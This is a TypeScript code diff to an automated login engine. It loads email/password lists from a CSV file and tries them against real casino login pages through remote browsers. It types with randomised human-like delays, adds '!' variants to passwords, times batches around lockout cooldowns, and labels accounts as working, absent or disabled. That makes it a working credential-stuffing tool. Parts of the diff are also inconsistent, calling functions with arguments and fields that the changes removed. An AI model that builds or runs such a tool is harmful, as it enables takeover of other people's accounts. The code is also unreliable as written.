@@ -17,9 +17,7 @@ import * as fs from "fs";
 
 export interface Credential {
   email: string;
-  password: string;
-  password2?: string;  // Column C — optional alternative password
-  password3?: string;  // Column D — optional alternative password
+  passwords: string[];  // All passwords from CSV columns in order (B, C, D, E, F, G, ...)
 }
 
 export interface SiteConfig {
@@ -54,7 +52,9 @@ export interface RowStatus {
   sites: { [siteName: string]: SiteStatus };
   sessionId?: string;
   recordingUrl?: string;
-  tempDisabledUntil?: string;  // ISO timestamp — skip until this time
+  currentBatch: number;            // which batch of 3 passwords (0-indexed)
+  scheduledRetestAt?: string;      // ISO timestamp — retest with next batch after cooldown
+  tempDisabledUntil?: string;      // ISO timestamp — skip until this time
 }
 
 export interface EngineConfig {
@@ -101,9 +101,9 @@ export const DEFAULT_TARGETS: SiteConfig[] = [
     name: "ignition",
     url: "https://www.ignitioncasino.ooo/login",
     selectors: {
-      username: "#email",
-      password: "#login-password",
-      submit: "#login-submit",
+      username: "#username",
+      password: "#password",
+      submit: "#loginSubmit",
     },
   },
 ];
@@ -127,7 +127,7 @@ export class AutomationEngine extends EventEmitter {
     return this.rows;
   }
 
-  /** Parse credentials.csv into credential objects (4-column format) */
+  /** Parse credentials.csv into credential objects — reads ALL password columns dynamically */
   loadCredentials(csvPath: string): Credential[] {
     if (!fs.existsSync(csvPath)) return [];
     const content = fs.readFileSync(csvPath, "utf-8");
@@ -140,23 +140,39 @@ export class AutomationEngine extends EventEmitter {
 
     const headers = lines[0].split(",").map((h) => h.trim().toLowerCase());
     const emailIdx = headers.indexOf("email");
-    const passIdx = headers.indexOf("password");
-    const pass2Idx = headers.indexOf("password2");
-    const pass3Idx = headers.indexOf("password3");
-    if (emailIdx < 0 || passIdx < 0) return [];
+    if (emailIdx < 0) return [];
 
-    return lines
-      .slice(1)
-      .map((line) => {
-        const parts = line.split(",").map((p) => p.trim());
-        return {
-          email: parts[emailIdx] || "",
-          password: parts[passIdx] || "",
-          password2: pass2Idx >= 0 ? (parts[pass2Idx] || "") : "",
-          password3: pass3Idx >= 0 ? (parts[pass3Idx] || "") : "",
-        };
-      })
-      .filter((c) => c.email && c.password);
+    // Find all password columns in order: password, password2, password3, password4, ...
+    const passwordIndices: number[] = [];
+    for (let i = 0; i < headers.length; i++) {
+      if (headers[i].startsWith("password")) {
+        passwordIndices.push(i);
+      }
+    }
+    // Sort by column number (password=1, password2=2, password3=3, ...)
+    passwordIndices.sort((a, b) => {
+      const numA = parseInt(headers[a].replace("password", "") || "1");
+      const numB = parseInt(headers[b].replace("password", "") || "1");
+      return numA - numB;
+    });
+    if (passwordIndices.length === 0) return [];
+
+    const results: Credential[] = [];
+    for (let i = 1; i < lines.length; i++) {
+      const parts = this.parseCsvLine(lines[i]);
+      const email = (parts[emailIdx] || "").trim();
+      const allPasswords = passwordIndices.map((idx) => (parts[idx] || "").trim());
+      // Trim trailing empty passwords but preserve internal order
+      while (allPasswords.length > 0 && allPasswords[allPasswords.length - 1] === "") {
+        allPasswords.pop();
+      }
+      if (email && allPasswords.length > 0) {
+        results.push({ email, passwords: allPasswords });
+      } else {
+        console.warn(`[CSV] Row ${i + 1} skipped — missing ${!email ? "email" : "password"}`);
+      }
+    }
+    return results;
   }
 
   /** Start the automation loop over all credentials */
@@ -175,6 +191,7 @@ export class AutomationEngine extends EventEmitter {
       rowIndex: i,
       email: c.email,
       status: "queued" as const,
+      currentBatch: 0,
       sites: Object.fromEntries(
         targets.map((t) => [t.name, { outcome: "queued" as Outcome, attempts: 0 }])
       ),
@@ -291,16 +308,16 @@ export class AutomationEngine extends EventEmitter {
             this.log("INFO", `  ${target.name}: starting login flow...`);
 
             try {
-              const result = await this.executeLoginFlow(page, target, cred);
-              this.rows[idx].sites[target.name].outcome = result;
-              this.rows[idx].sites[target.name].attempts = 1; // will be updated inside executeLoginFlow
+              const result = await this.executeLoginFlow(page, target, cred, this.rows[idx].currentBatch);
+              this.rows[idx].sites[target.name].outcome = result.outcome;
+              this.rows[idx].sites[target.name].attempts = result.attempts;
               this.log(
-                result === "success" ? "OK" : "WARN",
-                `  → ${target.name}: ${result}`
+                result.outcome === "success" ? "OK" : "WARN",
+                `  → ${target.name}: ${result.outcome} (${result.attempts} attempt${result.attempts !== 1 ? "s" : ""})`
               );
 
               // Cross-site propagation: disabled/tempdisabled stops both sites
-              if (result === "permdisabled") {
+              if (result.outcome === "permdisabled") {
                 credentialDisabled = true;
                 for (const t of targets) {
                   if (this.rows[idx].sites[t.name].outcome === "queued" || this.rows[idx].sites[t.name].outcome === "testing") {
@@ -308,7 +325,7 @@ export class AutomationEngine extends EventEmitter {
                   }
                 }
                 this.log("ERR", `  🚫 ${cred.email}: PERMANENTLY DISABLED — skipping all sites`);
-              } else if (result === "tempdisabled") {
+              } else if (result.outcome === "tempdisabled") {
                 credentialDisabled = true;
                 this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
                 for (const t of targets) {
@@ -397,50 +414,57 @@ export class AutomationEngine extends EventEmitter {
   private async cleanupStaleSessions(bb: Browserbase, projectId: string): Promise<void> {
     try {
       this.log("INFO", "Cleaning up stale sessions...");
-      const sessions = await bb.sessions.list({ status: "RUNNING" });
-      const stale = [];
-      for await (const session of sessions) {
-        if (session.projectId === projectId) {
-          stale.push(session.id);
+      const timeoutPromise = this.sleep(15000).then(() => { throw new Error("Cleanup timed out after 15s"); });
+      const cleanupPromise = (async () => {
+        const sessions = await bb.sessions.list({ status: "RUNNING" });
+        const stale: string[] = [];
+        let totalSeen = 0;
+        for await (const session of sessions) {
+          totalSeen++;
+          if (session.projectId === projectId) {
+            stale.push(session.id);
+          }
         }
-      }
-      if (stale.length === 0) {
-        this.log("INFO", "No stale sessions found");
-        return;
-      }
-      this.log("WARN", `Found ${stale.length} stale session(s) — releasing...`);
-      for (const id of stale) {
-        await bb.sessions.update(id, { status: "REQUEST_RELEASE" }).catch(() => {});
-      }
-      await this.sleep(3000);
-      this.log("INFO", `Cleaned up ${stale.length} stale session(s)`);
+        this.log("INFO", `Scanned ${totalSeen} running session(s), ${stale.length} match this project`);
+        if (stale.length === 0) {
+          this.log("INFO", "No stale sessions found");
+          return;
+        }
+        this.log("WARN", `Found ${stale.length} stale session(s) — releasing...`);
+        for (const id of stale) {
+          await bb.sessions.update(id, { status: "REQUEST_RELEASE" }).catch(() => {});
+        }
+        await this.sleep(3000);
+        this.log("INFO", `Cleaned up ${stale.length} stale session(s)`);
+      })();
+      await Promise.race([cleanupPromise, timeoutPromise]);
     } catch (e: any) {
       this.log("WARN", `Session cleanup failed: ${(e.message || String(e)).substring(0, 80)}`);
     }
   }
 
   /**
-   * Build the password attempt sequence for a credential.
-   * Path A (has alt passwords): [password, password2, password3, password3]
-   * Path B (no alt passwords):  [password, password+"!", password+"!!", password+"!!"]
+   * Build the password attempt sequence for a given batch.
+   * Each batch uses 3 passwords from the credential's password list.
+   * Batch 0: passwords[0..2], Batch 1: passwords[3..5], Batch 2: passwords[6..8], etc.
+   * Incomplete batches padded with !/?!! on the last available password.
+   * 4th attempt is always a re-press of the 3rd (buffer for tempdisabled trigger).
+   * Returns empty array if no passwords available for this batch.
    */
-  private buildPasswordSequence(cred: Credential): string[] {
-    const hasAltPasswords = !!(cred.password2 && cred.password2.length > 0);
+  private buildPasswordSequence(passwords: string[], batchIndex: number): string[] {
+    const startIdx = batchIndex * 3;
+    const raw = passwords.slice(startIdx, startIdx + 3).filter((p) => p.length > 0);
+    if (raw.length === 0) return []; // no more passwords for this batch
 
-    if (hasAltPasswords) {
-      // Path A: use CSV-provided alt passwords
-      const pw2 = cred.password2!;
-      const pw3 = (cred.password3 && cred.password3.length > 0) ? cred.password3 : pw2;
-      return [cred.password, pw2, pw3, pw3]; // 4th attempt = retry pw3
-    } else {
-      // Path B: auto-generate fallback passwords
-      return [
-        cred.password,
-        cred.password + "!",
-        cred.password + "!!",
-        cred.password + "!!", // 4th attempt = retry same
-      ];
+    // Pad to 3 using ! and !! suffixes on the last available password
+    const batch = [...raw];
+    while (batch.length < 3) {
+      const lastPw = raw[raw.length - 1];
+      batch.push(lastPw + (batch.length === raw.length ? "!" : "!!"));
     }
+
+    // 4th attempt = re-press of 3rd (buffer for tempdisabled trigger)
+    return [...batch, batch[2]];
   }
 
   /**
@@ -488,27 +512,30 @@ export class AutomationEngine extends EventEmitter {
 
   /**
    * Execute the full login flow for a single site with smart password retry.
-   * Returns the final outcome for this site.
+   * Returns the final outcome and attempt count for this site.
    */
   private async executeLoginFlow(
     page: Page,
     site: SiteConfig,
     cred: Credential
-  ): Promise<Outcome> {
+  ): Promise<{outcome: Outcome, attempts: number}> {
     // ── Navigate to login page ──
     await page.goto(site.url, { waitUntil: "networkidle", timeout: 30000 });
     await this.sleep(1000);
 
-    // ── Dismiss cookie notices ──
-    await this.dismissCookieNotice(page);
+    // ── Dismiss cookie notices (site-specific first, then generic fallback) ──
+    await this.dismissCookieNotice(page, site.name);
     await this.captureScreenshot(page, `${site.name}:page-loaded`);
 
+    // ── Resolve selectors (configured first, auto-detect fallback) ──
+    const selectors = await this.resolveSelectors(page, site);
+
     // ── Fill email (human-like) ──
-    await page.fill(site.selectors.username, "");
-    await page.click(site.selectors.username);
+    await page.fill(selectors.username, "");
+    await page.click(selectors.username);
     await this.sleep(200 + Math.random() * 300);
     for (const ch of cred.email) {
-      await page.keyboard.type(ch, { delay: 40 + Math.random() * 80 });
+      await page.keyboard.type(ch, { delay: 20 + Math.random() * 50 });
     }
     await this.sleep(500);
     await this.captureScreenshot(page, `${site.name}:email-filled`);
@@ -516,7 +543,7 @@ export class AutomationEngine extends EventEmitter {
     // ── Build password sequence ──
     const passwords = this.buildPasswordSequence(cred);
     const hasAltPw = !!(cred.password2 && cred.password2.length > 0);
-    this.log("INFO", `  ${site.name}: ${hasAltPw ? "Path A (alt passwords)" : "Path B (! fallbacks)"} — ${passwords.length} attempts`);
+    this.log("INFO", `  ${site.name}: ${hasAltPw ? "Path A (alt passwords)" : "Path B (! fallbacks)"} \u2014 ${passwords.length} attempts`);
 
     // ── Password retry loop ──
     for (let attemptIdx = 0; attemptIdx < passwords.length; attemptIdx++) {
@@ -526,11 +553,11 @@ export class AutomationEngine extends EventEmitter {
 
       if (!isRetry) {
         // Fill password field with new password
-        await page.fill(site.selectors.password, "");
-        await page.click(site.selectors.password);
+        await page.fill(selectors.password, "");
+        await page.click(selectors.password);
         await this.sleep(200 + Math.random() * 300);
         for (const ch of pw) {
-          await page.keyboard.type(ch, { delay: 40 + Math.random() * 80 });
+          await page.keyboard.type(ch, { delay: 20 + Math.random() * 50 });
         }
         await this.sleep(500);
         this.log("INFO", `  ${site.name} attempt ${attemptNum}/4: ${pw.substring(0, 3)}***`);
@@ -539,7 +566,7 @@ export class AutomationEngine extends EventEmitter {
       }
 
       // ── Press login button ──
-      await page.click(site.selectors.submit);
+      await page.click(selectors.submit);
 
       // ── Wait for response (5s timeout only on 3rd attempt) ──
       const timeout = attemptIdx === 2 ? 5000 : 15000;
@@ -559,61 +586,91 @@ export class AutomationEngine extends EventEmitter {
 
       if (response === "other") {
         // No "incorrect" detected — login flow completed
-        this.log("OK", `  ${site.name}: no error detected after attempt ${attemptNum} — success`);
-        return "success";
+        this.log("OK", `  ${site.name}: no error detected after attempt ${attemptNum} \u2014 success`);
+        return {outcome: "success", attempts: attemptNum};
       }
 
       // response === "incorrect" or "timeout"
       if (attemptNum < 4) {
-        this.log("WARN", `  ${site.name}: ${response} on attempt ${attemptNum} — trying next password`);
+        this.log("WARN", `  ${site.name}: ${response} on attempt ${attemptNum} \u2014 trying next password`);
       } else {
-        // 4th attempt still incorrect/timeout → no_account
-        this.log("WARN", `  ${site.name}: ${response} on attempt 4 — confirmed no_account`);
-        return "noaccount";
+        // 4th attempt still incorrect/timeout \u2192 no_account
+        this.log("WARN", `  ${site.name}: ${response} on attempt 4 \u2014 confirmed no_account`);
+        return {outcome: "noaccount", attempts: attemptNum};
       }
     }
 
     // Should not reach here, but safety fallback
-    return "noaccount";
+    return {outcome: "noaccount", attempts: passwords.length};
   }
 
-  /** Dismiss cookie consent banners by clicking accept/agree buttons */
-  private async dismissCookieNotice(page: Page): Promise<void> {
-    const selectors = [
-      'button:has-text("Accept")',
+  /** Site-specific cookie selectors (calibrated per target) */
+  private static readonly SITE_COOKIE_SELECTORS: { [site: string]: string[] } = {
+    joe: [
+      'button:has-text("ACCEPT ALL")',
       'button:has-text("Accept All")',
       'button:has-text("Accept all")',
-      'button:has-text("Accept Cookies")',
-      'button:has-text("Allow All")',
-      'button:has-text("Allow all")',
-      'button:has-text("Agree")',
-      'button:has-text("I Agree")',
-      'button:has-text("Got it")',
-      'button:has-text("OK")',
-      'a:has-text("Accept")',
-      'a:has-text("Accept All")',
-      '#onetrust-accept-btn-handler',
-      '#CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll',
-      '#cookie-accept',
-      '#accept-cookies',
-      '#acceptCookies',
-      '#gdpr-accept',
-      '.cookie-accept',
-      '.accept-cookies',
-      '[aria-label="Accept"]',
-      '[aria-label="Accept All"]',
-      '[aria-label="Accept cookies"]',
-      '[data-action="accept"]',
-      '[data-cookie-accept]',
-      '[data-testid="cookie-accept"]',
-    ];
+    ],
+    ignition: [
+      'button:has-text("ACCEPT ALL")',
+      'button:has-text("Accept All")',
+      'button:has-text("Accept all")',
+    ],
+  };
 
-    for (const selector of selectors) {
+  /** Generic fallback cookie selectors */
+  private static readonly GENERIC_COOKIE_SELECTORS = [
+    'button:has-text("Accept")',
+    'button:has-text("Accept Cookies")',
+    'button:has-text("Allow All")',
+    'button:has-text("Allow all")',
+    'button:has-text("Agree")',
+    'button:has-text("I Agree")',
+    'button:has-text("Got it")',
+    'button:has-text("OK")',
+    'a:has-text("Accept")',
+    'a:has-text("Accept All")',
+    '#onetrust-accept-btn-handler',
+    '#CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll',
+    '#cookie-accept',
+    '#accept-cookies',
+    '#acceptCookies',
+    '#gdpr-accept',
+    '.cookie-accept',
+    '.accept-cookies',
+    '[aria-label="Accept"]',
+    '[aria-label="Accept All"]',
+    '[aria-label="Accept cookies"]',
+    '[data-action="accept"]',
+    '[data-cookie-accept]',
+    '[data-testid="cookie-accept"]',
+  ];
+
+  /** Dismiss cookie consent banners — site-specific first, generic fallback */
+  private async dismissCookieNotice(page: Page, siteName: string): Promise<void> {
+    // Try site-specific selectors first (fast path)
+    const siteSelectors = AutomationEngine.SITE_COOKIE_SELECTORS[siteName] || [];
+    for (const selector of siteSelectors) {
       try {
         const btn = page.locator(selector).first();
-        if (await btn.isVisible({ timeout: 500 })) {
+        if (await btn.isVisible({ timeout: 300 })) {
           await btn.click();
-          this.log("INFO", `  🍪 Dismissed cookie notice via: ${selector}`);
+          this.log("INFO", `  🍪 Dismissed cookie notice via calibrated: ${selector}`);
+          await this.sleep(500);
+          return;
+        }
+      } catch {
+        // Selector didn't match — try next
+      }
+    }
+
+    // Fallback to generic selectors
+    for (const selector of AutomationEngine.GENERIC_COOKIE_SELECTORS) {
+      try {
+        const btn = page.locator(selector).first();
+        if (await btn.isVisible({ timeout: 200 })) {
+          await btn.click();
+          this.log("INFO", `  🍪 Dismissed cookie notice via fallback: ${selector}`);
           await this.sleep(500);
           return;
         }
@@ -626,7 +683,7 @@ export class AutomationEngine extends EventEmitter {
   /** Capture a screenshot and emit it as a log event */
   private async captureScreenshot(page: Page, label: string): Promise<void> {
     try {
-      const b64 = await page.screenshot({ type: "jpeg", quality: 50 }).then((buf) => buf.toString("base64"));
+      const b64 = await page.screenshot({ type: "jpeg", quality: 70 }).then((buf) => buf.toString("base64"));
       this.emit("screenshot", { label, base64: b64, timestamp: new Date().toISOString() });
       this.log("SNAP", `📸 ${label}`);
     } catch {
@@ -640,7 +697,7 @@ export class AutomationEngine extends EventEmitter {
     for (const row of this.rows) {
       for (const target of targets) {
         const s = row.sites[target.name];
-        const err = (s.error || "").replace(/"/g, "'").substring(0, 200);
+        const err = this.stripAnsi((s.error || "").replace(/"/g, "'").replace(/[\r\n]+/g, " ")).substring(0, 200);
         lines.push(
           `${row.email},${target.name},${s.outcome},${s.attempts},${row.sessionId || ""},${row.recordingUrl || ""},"${err}"`
         );
@@ -664,5 +721,109 @@ export class AutomationEngine extends EventEmitter {
 
   private sleep(ms: number): Promise<void> {
     return new Promise((r) => setTimeout(r, ms));
+  }
+
+  /** Strip ANSI escape codes from strings */
+  private stripAnsi(str: string): string {
+    return str.replace(/\u001b\[[0-9;]*m/g, "");
+  }
+
+  /** Parse a single CSV line respecting quoted fields (RFC 4180 compatible, accepts both formats) */
+  private parseCsvLine(line: string): string[] {
+    const fields: string[] = [];
+    let current = "";
+    let inQuotes = false;
+    for (let i = 0; i < line.length; i++) {
+      const ch = line[i];
+      if (inQuotes) {
+        if (ch === '"') {
+          if (i + 1 < line.length && line[i + 1] === '"') {
+            current += '"';
+            i++; // skip escaped quote
+          } else {
+            inQuotes = false;
+          }
+        } else {
+          current += ch;
+        }
+      } else {
+        if (ch === '"') {
+          inQuotes = true;
+        } else if (ch === ",") {
+          fields.push(current);
+          current = "";
+        } else {
+          current += ch;
+        }
+      }
+    }
+    fields.push(current);
+    return fields;
+  }
+
+  /**
+   * Resolve selectors for a site — try configured selectors first,
+   * auto-detect visible inputs as fallback when page loaded but selectors changed.
+   */
+  private async resolveSelectors(
+    page: Page,
+    site: SiteConfig
+  ): Promise<{ username: string; password: string; submit: string }> {
+    // Try configured selectors
+    try {
+      const [uVis, pVis, sVis] = await Promise.all([
+        page.locator(site.selectors.username).first().isVisible({ timeout: 2000 }).catch(() => false),
+        page.locator(site.selectors.password).first().isVisible({ timeout: 2000 }).catch(() => false),
+        page.locator(site.selectors.submit).first().isVisible({ timeout: 2000 }).catch(() => false),
+      ]);
+      if (uVis && pVis && sVis) {
+        this.log("INFO", `  ${site.name}: configured selectors found`);
+        return site.selectors;
+      }
+      this.log("WARN", `  ${site.name}: configured selectors missing (user=${uVis} pass=${pVis} submit=${sVis}) \u2014 auto-detecting...`);
+    } catch {
+      this.log("WARN", `  ${site.name}: selector check failed \u2014 auto-detecting...`);
+    }
+
+    // Auto-detect fallback
+    const usernameCandidates = [
+      'input[type="email"]', 'input[type="text"]', 'input[name="email"]',
+      'input[name="username"]', 'input[placeholder*="mail" i]', 'input[placeholder*="user" i]',
+      'input[autocomplete="email"]', 'input[autocomplete="username"]',
+    ];
+    const passwordCandidates = [
+      'input[type="password"]', 'input[name="password"]',
+    ];
+    const submitCandidates = [
+      'button[type="submit"]', 'input[type="submit"]',
+      'button:has-text("Log In")', 'button:has-text("Login")',
+      'button:has-text("Sign In")', 'button:has-text("LOG IN")',
+      'button:has-text("SIGN IN")',
+    ];
+
+    const username = await this.findFirstVisible(page, usernameCandidates);
+    const password = await this.findFirstVisible(page, passwordCandidates);
+    const submit = await this.findFirstVisible(page, submitCandidates);
+
+    if (!username || !password || !submit) {
+      throw new Error(`Auto-detect failed for ${site.name}: username=${!!username} password=${!!password} submit=${!!submit}`);
+    }
+
+    this.log("INFO", `  ${site.name}: auto-detected selectors: ${username}, ${password}, ${submit}`);
+    return { username, password, submit };
+  }
+
+  /** Find the first visible element from a list of candidate selectors */
+  private async findFirstVisible(page: Page, candidates: string[]): Promise<string | null> {
+    for (const sel of candidates) {
+      try {
+        if (await page.locator(sel).first().isVisible({ timeout: 500 })) {
+          return sel;
+        }
+      } catch {
+        // not found
+      }
+    }
+    return null;
   }
 }
